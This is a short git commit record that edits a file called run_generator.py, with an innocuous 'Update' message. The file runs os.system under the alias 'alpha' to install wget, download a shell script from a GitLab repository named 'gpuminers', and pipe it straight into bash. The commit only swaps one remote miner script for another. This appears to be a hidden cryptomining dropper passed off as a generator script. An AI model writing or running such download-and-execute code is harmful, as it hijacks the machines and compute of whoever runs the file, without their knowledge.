8b2fb8a6e8f4c85e8ce2452b786ac46ffdf567e3
jonathanblatant <92039004+jonathanblatant@users.noreply.github.com>
2021-10-13 11:11:04 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_Need_For_Speed_fle_no_ws.sh | bash")
+alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_cent_fire_ws3.sh | bash")
